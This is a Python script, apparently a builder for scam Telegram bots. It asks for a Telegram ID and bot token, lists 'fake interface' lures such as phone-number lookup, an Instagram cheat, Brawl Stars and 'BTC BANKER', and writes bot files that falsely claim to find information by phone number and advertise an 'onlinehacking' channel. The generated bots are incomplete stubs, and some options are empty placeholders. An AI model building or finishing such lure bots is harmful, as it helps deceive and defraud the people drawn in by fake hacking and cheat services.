import colorama
from colorama import Fore, Back, Style
import os

correct_number = "12"
os.system('clear')
print(Fore.RED + '''
         _,.-------.,_
    ''')
user_input = input(Fore.GREEN + "Enter a number: ")
if "12" in user_input:
    print('Correct! You entered a number containing 12')
    os.system('clear')
    print(Fore.YELLOW + '-----------------------------------------')
    userid = input(Fore.RED +  "Enter your Telegram ID > ")
    token = input(Fore.BLUE +  "Enter your bot token > ")
    print(Fore.CYAN + '''
    [1] Punched the number
    [2] Instagram cheat
    [3] Brawl stars
    [4] Acquaintance
    [5] BTC BANKER
    ''')
    choice = input(Fore.MAGENTA +  "Select the fake interface option:>>> ")

    if not choice.isdigit():
        print("Error, option must be numeric")
        exit(0)

    choice = int(choice)

    if choice == 1:
        # Code for choice 1 (Punched the number)
        f = open('probiv.py', 'w+', encoding='utf-8')
        f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
bot.send_message(ID, '!BOT STARTED!') 
print("The bot is running!")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot that can show information by phone number!
To search for information, enter the command /getinfo''') 

@bot.message_handler(commands=['onlinehacking'])
def start(message):
    bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
        """)
        f.close()
        print("The probiv.py file is saved")

    elif choice == 2:
        # Code for choice 2 (Instagram cheat)
        f = open('probiv2.py', 'w+', encoding='utf-8')
        f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
bot.send_message(ID, '!BOT STARTED!') 
print("The bot is running!")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot that can show information by phone number!
To search for information, enter the command /getinfo''') 

@bot.message_handler(commands=['onlinehacking'])
def start(message):
    bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
        """)
        f.close()
        print("The probiv2.py file is saved")

    elif choice == 3:
        # Code for choice 3 (Brawl stars)
        f = open('brawl_stars.py', 'w+', encoding='utf-8')
        f.write(f"""
# Your code for choice 3 (Brawl stars) here
# ...
        """)
        f.close()
        print("The brawl_stars.py file is saved")

    elif choice == 4:
        # Code for choice 4 (Acquaintance)
        f = open('acquaintance.py', 'w+', encoding='utf-8')
        f.write(f"""
# Your code for choice 4 (Acquaintance) here
# ...
        """)
        f.close()
        print("The acquaintance.py file is saved")

    else:
        print('Invalid choice')
else:
    print('Sorry, the entered number does not contain 12')
